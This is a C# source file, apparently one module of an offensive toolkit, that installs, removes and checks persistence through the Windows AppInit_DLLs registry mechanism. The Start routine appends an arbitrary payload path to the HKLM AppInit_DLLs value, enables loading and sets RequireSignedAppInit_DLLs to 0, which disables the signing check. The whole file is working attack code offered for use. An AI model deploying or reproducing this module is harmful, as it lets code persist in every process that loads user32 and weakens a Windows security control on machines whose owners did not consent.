using System;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string RegPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";
        private const string AppInitValue = "AppInit_DLLs";
        private const string LoadAppInitValue = "LoadAppInit_DLLs";
        private const string RequireSignedValue = "RequireSignedAppInit_DLLs";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 appinit_dlls Start {defaultPayload}";
        }

        public static string Start(string[] args)
        {
            string payloadPath = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : GetDefaultPayloadPath();

            try
            {
                using var regKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return "[-] Access denied opening AppInit registry key. Run as administrator.";

                string currentValue = regKey.GetValue(AppInitValue)?.ToString() ?? string.Empty;

                if (currentValue.IndexOf(payloadPath, StringComparison.OrdinalIgnoreCase) >= 0)
                    return $"[*] DLL '{payloadPath}' already present in AppInit_DLLs configuration.";

                string newValue = string.IsNullOrWhiteSpace(currentValue)
                    ? payloadPath
                    : currentValue.TrimEnd() + " " + payloadPath;

                regKey.SetValue(AppInitValue, newValue, RegistryValueKind.String);
                regKey.SetValue(LoadAppInitValue, 1, RegistryValueKind.DWord);
                regKey.SetValue(RequireSignedValue, 0, RegistryValueKind.DWord);

                return $"[+] Installed '{payloadPath}' into AppInit_DLLs configuration. " +
                       $"LoadAppInit_DLLs set to 1, RequireSignedAppInit_DLLs set to 0.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. AppInit DLL system-level properties require administrative privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string payloadPath = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : GetDefaultPayloadPath();

            try
            {
                using var regKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return "[-] Access denied opening AppInit registry key. Run as administrator.";

                string currentValue = regKey.GetValue(AppInitValue)?.ToString() ?? string.Empty;

                if (currentValue.IndexOf(payloadPath, StringComparison.OrdinalIgnoreCase) < 0)
                    return $"[*] DLL '{payloadPath}' not found in AppInit_DLLs.";

                string newValue = RemoveFromValue(currentValue, payloadPath);
                regKey.SetValue(AppInitValue, newValue, RegistryValueKind.String);

                if (string.IsNullOrWhiteSpace(newValue))
                    regKey.SetValue(LoadAppInitValue, 0, RegistryValueKind.DWord);

                return $"[+] Removed '{payloadPath}' from AppInit_DLLs. Remaining AppInit_DLLs: '{newValue}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. AppInit DLL modification tasks require elevated privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string payloadPath = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : GetDefaultPayloadPath();

            try
            {
                using var regKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (regKey == null)
                    return "[-] Access denied opening AppInit registry key.";

                string currentValue = regKey.GetValue(AppInitValue)?.ToString() ?? string.Empty;
                int loadEnabled = Convert.ToInt32(regKey.GetValue(LoadAppInitValue) ?? 0);
                int requireSigned = Convert.ToInt32(regKey.GetValue(RequireSignedValue) ?? 0);

                if (currentValue.IndexOf(payloadPath, StringComparison.OrdinalIgnoreCase) < 0)
                    return $"[*] DLL '{payloadPath}' not found inside active AppInit_DLLs configuration. " +
                           $"(AppInit_DLLs: '{currentValue}', LoadAppInit_DLLs: {loadEnabled}, RequireSigned: {requireSigned})";

                return $"[+] Verified '{payloadPath}' in AppInit_DLLs | " +
                       $"LoadAppInit_DLLs: {loadEnabled} | " +
                       $"RequireSignedAppInit_DLLs: {requireSigned} | " +
                       $"Full AppInit_DLLs string: '{currentValue}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied checking AppInit configuration parameters.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during verification: {ex.Message}";
            }
        }

        private static string RemoveFromValue(string currentValue, string payload)
        {
            string result = currentValue;

            // Handle space-separated removals
            int index = result.IndexOf(" " + payload, StringComparison.OrdinalIgnoreCase);
            if (index >= 0)
            {
                result = result.Remove(index, (" " + payload).Length);
            }
            else
            {
                index = result.IndexOf(payload + " ", StringComparison.OrdinalIgnoreCase);
                if (index >= 0)
                {
                    result = result.Remove(index, (payload + " ").Length);
                }
                else
                {
                    index = result.IndexOf(payload, StringComparison.OrdinalIgnoreCase);
                    if (index >= 0)
                        result = result.Remove(index, payload.Length);
                }
            }

            while (result.Contains("  "))
                result = result.Replace("  ", " ");

            return result.Trim();
        }
    }
}